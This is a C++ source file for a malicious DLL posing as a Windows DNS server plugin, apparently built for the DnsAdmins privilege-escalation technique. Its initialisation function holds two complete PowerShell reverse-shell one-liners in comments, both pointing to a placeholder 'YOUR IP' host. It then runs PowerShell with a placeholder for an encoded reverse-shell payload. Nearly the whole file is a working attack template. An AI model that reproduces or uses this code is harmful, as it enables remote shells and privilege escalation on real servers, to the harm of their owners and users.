
#include "stdafx.h"
#include <iostream>
#include <fstream>


#define DNS_PLUGIN_API  __declspec ( dllexport )

#pragma comment(linker,"/EXPORT:DnsPluginInitialize=?DnsPluginInitialize@@YAHPEAX0@Z")
DNS_PLUGIN_API int DnsPluginInitialize(PVOID a1, PVOID a2) {
    //Use this lines to create Reverse shell
    
    //https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1
    //$client = New-Object System.Net.Sockets.TCPClient('YOUR IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
    //$sm = (New - Object Net.Sockets.TCPClient('YOUR IP', 55555)).GetStream(); [byte[]] $bt = 0..65535 | % {0}; while (($i = $sm.Read($bt, 0, $bt.Length)) - ne 0) { ; $d = (New - Object Text.ASCIIEncoding).GetString($bt, 0, $i); $st = ([text.encoding]::ASCII).GetBytes((iex $d 2 > & 1)); $sm.Write($st, 0, $st.Length) }

    //Use this library to encrypt your reverse shell 
    //https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Encode.ps1


    system("C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -e [YOUR ENCRYPTED REVERSE SHELL]");
    return 0; 
}

#pragma comment(linker,"/EXPORT:DnsPluginCleanup=?DnsPluginCleanup@@YAHXZ")
DNS_PLUGIN_API int DnsPluginCleanup() { return 0; }

#pragma comment(linker,"/EXPORT:DnsPluginQuery=?DnsPluginQuery@@YAHPEAX000@Z")
DNS_PLUGIN_API int DnsPluginQuery(PVOID a1, PVOID a2, PVOID a3, PVOID a4) { return 0; }